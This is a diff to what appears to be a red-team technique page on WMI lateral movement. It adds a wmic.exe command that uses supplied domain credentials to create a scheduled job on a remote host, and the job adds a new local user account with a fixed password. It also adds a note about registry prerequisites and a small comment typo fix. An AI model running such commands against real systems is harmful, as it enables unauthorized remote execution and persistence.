@@ -135,7 +135,17 @@ Unregister-ScheduledTask -CimSession $Session -TaskName "MyTask"
 {% tab title="Windows - wmic.exe" %}
 We can create scheduled tasks on a remote target using wmic.exe
 
+{% hint style="danger" %}
+In Windows 8 and higher, you can only create scheduled jobs with WMI if the registry key **`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Configuration`** has a value **`EnableAt=1`** of type **`REG_DWORD`**. Therefore, this technique is unlikely to be found in the wild.
+{% endhint %}
 
+```powershell
+#Create a scheduled task & start it
+wmic.exe /node:TARGET /user:DOMAIN\USER /password:PASSWORD path Win32_ScheduledJob create Command="net user schTaskUser Pass123 /add",DaysOfMonth=1,DaysOfWeek=1,InteractWithDesktop=False,RunRepeatedly=False,StartTime="********143000.000000-420"
+ 
+#Delete the task
+wmic.exe /node:TARGET /user:DOMAIN\USER /password:PASSWORD path Win32_ScheduledJob where "JobiD like '1'" call Delete
+```
 {% endtab %}
 {% endtabs %}
 
@@ -181,7 +191,7 @@ Invoke-CimMethod -InputObject $Service -MethodName Delete
 We can create a service on a remote target using wmic.exe.
 
 ```powershell
-#I didn't find a way to create service using wmic.exe
+#I didn't find a way to create services using wmic.exe
 #Contcat me if you did
 
 #Start it
